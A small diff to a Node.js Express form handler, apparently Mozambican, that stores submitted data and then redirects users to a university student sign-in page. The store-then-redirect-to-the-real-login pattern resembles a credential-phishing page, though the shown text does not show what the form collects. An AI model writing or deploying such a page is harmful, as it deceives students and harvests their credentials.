@@ -47,7 +47,8 @@ app.post('/submit', (req, res) => {
             return;
         }
         console.log('Dados inseridos com sucesso: ', results);
-        res.sendFile(__dirname + '/index.html');
+        res.redirect('https://estudante.siga.uem.mz/account/signin');
+        
     });
 });
 
